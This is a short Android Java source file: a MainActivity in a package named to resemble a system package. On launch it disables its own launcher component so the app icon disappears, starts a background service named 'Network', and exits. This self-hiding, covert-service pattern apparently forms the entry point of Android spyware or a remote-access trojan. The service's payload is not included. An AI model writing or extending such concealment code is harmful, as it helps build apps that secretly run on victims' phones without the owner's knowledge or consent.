package com.android.anonim_;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        String pgkname = getApplicationContext().getPackageName();
        ComponentName componentToDisable = new ComponentName(pgkname, pgkname + ".MainActivity");
        getApplicationContext().getPackageManager().setComponentEnabledSetting(
                componentToDisable,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        getApplicationContext().startService(new Intent(getApplicationContext(), Network.class));
        this.finish();
    }
}
